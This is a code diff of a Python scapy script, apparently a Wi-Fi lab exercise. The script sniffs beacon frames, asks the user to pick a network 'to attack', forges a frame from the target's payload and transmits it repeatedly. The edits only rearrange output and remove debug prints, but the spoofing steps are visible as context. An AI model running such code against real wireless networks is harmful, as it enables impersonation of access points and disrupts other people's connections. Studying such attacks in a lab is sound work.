@@ -28,10 +28,8 @@ def packetHandler(pkt):
             # We make sure to have neither duplicates, nor empty packets in the ssid list
             if(pkt.info not in ssid_list and len(pkt.info) > 0):
                 ssid_list.append(pkt)
-                # We print the list of retrieved ssids
-                for i in range(len(ssid_list)):
-                    print(str(i) + ' - ' + str(ssid_list[i].info) + ' : ' + str(ssid_list[i].dBm_AntSignal) + 'dBm')
-                print("#-------------------------#")
+                print("Scanning...")
+                
         except AttributeError as e:
                 print(e)
                 return
@@ -43,6 +41,12 @@ def packetHandler(pkt):
 # timeout: sniffing duration in seconds
 sniff(iface=interface, count=0, prn=packetHandler, store=0, timeout=2)
 
+# We print the list of retrieved ssids
+print("#-------------------------#")
+for i in range(len(ssid_list)):
+    print(str(i) + ' - ' + str(ssid_list[i].info) + ' : ' + str(ssid_list[i].dBm_AntSignal) + 'dBm')
+print("#-------------------------#")
+
 # We ask the user to choose the network to attack
 target = int(input("Select a ssid: "))
 
@@ -52,10 +56,6 @@ try:
 
     print("You choose " + str(target_pkt.info))
 
-    #print("\nPacket Summary:\n" + str(target_pkt.summary()))
-    #print("\nPacket content:")
-    #target_pkt.show()
-    
     # We retrieve the end of the packet
     payload = target_pkt.getlayer(6)
 
@@ -79,8 +79,6 @@ try:
 
     frame = packet/payload
 
-    #print("\n-------------------------------\nShow frame:")
-    #frame.show()
     input("\nPress enter to send\n")
     
     sendp(frame,count=100, iface=interface, inter=0.1, loop=1)
